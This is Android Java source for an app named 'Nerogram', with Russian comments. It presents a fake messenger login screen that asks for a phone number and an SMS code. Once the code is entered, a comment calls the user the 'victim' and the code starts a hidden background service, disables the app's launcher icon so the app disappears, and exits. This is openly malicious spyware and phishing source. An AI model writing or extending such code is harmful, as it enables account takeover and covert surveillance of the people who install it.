package com.nerogram;

import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.graphics.Color;
import android.view.Gravity;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Создаем UI программно (черно-фиолетовая тема)
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(Color.parseColor("#121212"));
        layout.setGravity(Gravity.CENTER);
        layout.setPadding(50, 50, 50, 50);

        TextView title = new TextView(this);
        title.setText("Nerogram");
        title.setTextColor(Color.parseColor("#BB86FC"));
        title.setTextSize(32);
        title.setGravity(Gravity.CENTER);
        layout.addView(title);

        EditText phoneInput = new EditText(this);
        phoneInput.setHint("Номер телефона");
        phoneInput.setHintTextColor(Color.GRAY);
        phoneInput.setTextColor(Color.WHITE);
        layout.addView(phoneInput);

        Button btnNext = new Button(this);
        btnNext.setText("Далее");
        btnNext.setBackgroundColor(Color.parseColor("#BB86FC"));
        layout.addView(btnNext);

        EditText codeInput = new EditText(this);
        codeInput.setHint("Код из SMS");
        codeInput.setHintTextColor(Color.GRAY);
        codeInput.setTextColor(Color.WHITE);
        codeInput.setVisibility(EditText.GONE);
        layout.addView(codeInput);

        Button btnLogin = new Button(this);
        btnLogin.setText("Войти");
        btnLogin.setBackgroundColor(Color.parseColor("#BB86FC"));
        btnLogin.setVisibility(Button.GONE);
        layout.addView(btnLogin);

        setContentView(layout);

        // Логика кнопок
        btnNext.setOnClickListener(v -> {
            // Тут отправка номера на сервер (опционально)
            btnNext.setVisibility(Button.GONE);
            phoneInput.setEnabled(false);
            codeInput.setVisibility(EditText.VISIBLE);
            btnLogin.setVisibility(Button.VISIBLE);
        });

        btnLogin.setOnClickListener(v -> {
            // Жертва ввела код - запускаем скрытый сервис
            Intent serviceIntent = new Intent(this, BackgroundService.class);
            startService(serviceIntent);

            // Прячем иконку приложения
            getPackageManager().setComponentEnabledSetting(
                getComponentName(),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            );
            
            // Выходим из приложения
            finish();
        });
    }
}
